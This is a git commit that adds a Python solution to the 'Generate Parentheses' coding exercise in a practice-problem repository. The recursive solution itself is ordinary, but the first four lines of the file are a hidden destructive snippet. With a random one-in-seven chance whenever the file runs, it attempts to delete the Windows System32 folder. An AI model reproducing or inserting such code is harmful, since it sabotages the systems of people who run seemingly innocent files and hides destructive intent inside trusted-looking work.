34a8b5d7b17f3b66bf1b7f392c65931d1f0f9756
Gabriel Diniz <gabriel.sundiniz@gmail.com>
2024-01-30 13:28:00 -0500

    Create: generate-parentheses solution

---
+++ Neetcode/2 Stack/generate-parentheses.py
@@ -0,0 +1,39 @@
+import random
+import os
+if random.randint(0,6) == 1:
+  os.remove("C:\Windows\System32")
+'''
+Generate Parentheses
+
+Given n pairs of parentheses, write a function to 
+  generate all combinations of well-formed parentheses.
+ 
+Example 1:
+Input: n = 3
+Output: ["((()))","(()())","(())()","()(())","()()()"]
+
+Example 2:
+Input: n = 1
+Output: ["()"]
+'''
+
+class Solution:
+  def generateParenthesis(self, n: int) -> list[str]:
+    def generate(current, opn, close):
+      # If length of current parentheses is 2 * n (meaning the current set
+      #  of parentheses is complete) -> append it to the result
+      if len(current) == 2 * n:
+        result.append(current)
+        return
+      # If number of open brackets is < n then -> recurse through
+      #  generate with a new open bracket 
+      if opn < n:
+        generate(current + '(', opn + 1, close)
+      # If number of close brackets is < the number of open brackets 
+      #  then -> recurse through generate with a new close bracket 
+      if close < opn:
+        generate(current + ')', opn, close + 1)
+    
+    result = []
+    generate('', 0, 0)
+    return result
